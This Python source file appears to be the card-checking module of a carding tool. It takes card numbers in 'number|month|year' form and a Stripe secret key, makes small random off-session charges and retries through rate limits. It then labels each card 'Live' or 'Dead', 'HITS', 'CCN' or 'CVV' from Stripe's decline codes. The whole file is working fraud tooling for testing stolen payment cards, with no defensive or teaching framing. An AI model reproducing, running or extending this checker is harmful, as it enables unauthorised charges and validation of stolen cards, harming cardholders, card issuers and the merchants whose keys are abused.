import traceback
import stripe
import requests , random
from FUNC.defs import *
def cvv_charge(fullcc,sk):
    try:
        stripe.api_key = sk
        splitter = fullcc.split("|")
        cc = splitter[0]
        mes = splitter[1]
        ano = splitter[2]
        while True:
            try:
                result1 = stripe.PaymentMethod.create(
                  type="card",
                  card={
                    "number": f"{cc}",
                    "exp_month": f"{mes}",
                    "exp_year": f"{ano}",
                  },
                )
                break
            except Exception as e:
                result1 = str(e)
                if "Request rate limit exceeded." in result1:
                    continue
                else:
                    break
        try:
            id = result1.id
        except:
            return result1
        
        while True:
            try:
                result2 = stripe.PaymentIntent.create(
            amount=random.randint(60, 70),
            currency="usd",
            payment_method_types=["card"],
            payment_method=f"{id}",
            confirm="true",
            off_session="true",
          )
                result2 = "succeeded"
                break
            except Exception as e:
                result2 = str(e)
                if "Request rate limit exceeded." in result2:
                    continue
                else:   
                    break
        return result2
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")


def getcvvresult(fullcc, sk):
    try:
        from FUNC.defs import check_stripe , getsk , getallsk
        result = cvv_charge(fullcc, sk)
        if '"seller_message": "Payment complete."' in result or "succeeded" in result:
            status = "Live 🟢"
            response = "Charged 0.5$ 🔥"
            hits = "HITS"

        elif "insufficient_funds" in result or "card has insufficient funds." in result:
            status = "Live 🟢"
            response = "Insufficient Funds ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "incorrect_cvc" in result or "security code is incorrect." in result or "Your card's security code is incorrect." in result or "Your card's security code is invalid." in result :
            status = "Live 🟡"
            response = "CCN Live ❎"
            hits = "CCN"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "transaction_not_allowed" in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif '"cvc_check": "pass"' in result:
            status = "Live 🟢"
            response = "CVV LIVE ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "three_d_secure_redirect" in result or "card_error_authentication_required" in result:
            status = "Live 🟡"
            response = "3D Secure Redirected ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "stripe_3ds2_fingerprint" in result:
            status = "Live 🟡"
            response = "3D Secured ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "Your card does not support this type of purchase." in result:
            status = "Live 🟡"
            response = "Card Doesn't Support Purchase ❎"
            hits = "CVV"
            resp = f"<b>{fullcc} - {response}</b>"

        elif "generic_decline" in result or "You have exceeded the maximum number of declines on this card in the last 24 hour period." in result or "card_decline_rate_limit_exceeded" in result:
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"

        elif "do_not_honor" in result:
            status = "Dead 🔴"
            response = "Do Not Honor 🚫"
            hits = "NO"

        elif "fraudulent" in result:
            status = "Dead 🔴"
            response = "Fraudulent 🚫"
            hits = "NO"

        elif "stolen_card" in result:
            status = "Dead 🔴"
            response = "Stolen Card 🚫"
            hits = "NO"

        elif "lost_card" in result:
            status = "Dead 🔴"
            response = "Lost Card 🚫"
            hits = "NO"

        elif "pickup_card" in result:
            status = "Dead 🔴"
            response = "Pickup Card 🚫"
            hits = "NO"

        elif "incorrect_number" in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif "Your card has expired." in result or "expired_card" in result:
            status = "Dead 🔴"
            response = "Expired Card 🚫"
            hits = "NO"

        elif "intent_confirmation_challenge" in result:
            status = "Dead 🔴"
            response = "Captcha 😥"
            hits = "NO"

        elif "Your card number is incorrect." in result:
            status = "Dead 🔴"
            response = "Incorrect Card Number 🚫"
            hits = "NO"

        elif "Your card's expiration year is invalid." in result or "Your card\'s expiration year is invalid." in result:
            status = "Dead 🔴"
            response = "Expiration Year Invalid 🚫"
            hits = "NO"

        elif "Your card's expiration month is invalid." in result or "invalid_expiry_month" in result:
            status = "Dead 🔴"
            response = "Expiration Month Invalid 🚫"
            hits = "NO"

        elif "card is not supported." in result:
            status = "Dead 🔴"
            response = "Card Not Supported 🚫"
            hits = "NO"

        elif "invalid_account" in result:
            status = "Dead 🔴"
            response = "Dead Card 🚫"
            hits = "NO"

        elif "Invalid API Key provided" in result or "testmode_charges_only" in result or "api_key_expired" in result:
            status = "Dead 🔴"
            response = "stripe error . contact support@stripe.com for more details 🚫"
            hits = "NO"
        elif "Invalid API Key provided" in result or "account cannot currently make live charges" in result or "Expired API Key" in result:
            status = "Dead 🔴"
            response = "stripe error . contact support@stripe.com for more details 🚫"
            hits = "NO"
        elif "Your card was declined." in result or "card was declined" in result:
            status = "Dead 🔴"
            response = "Generic Decline 🚫"
            hits = "NO"

        else:
            status = "Dead 🔴"
            response = f"Card Declined 🚫"
            hits = "NO"
            try:
                with open ("FILES/Result_Logs.txt", "a") as f:
                    f.write(f"{result}\n")
            except:
                pass

        return response, hits,fullcc
    except Exception as e:
        tb = traceback.format_exc()
        with open("error_logs.txt", "a") as f:
            f.write(tb + "\n")
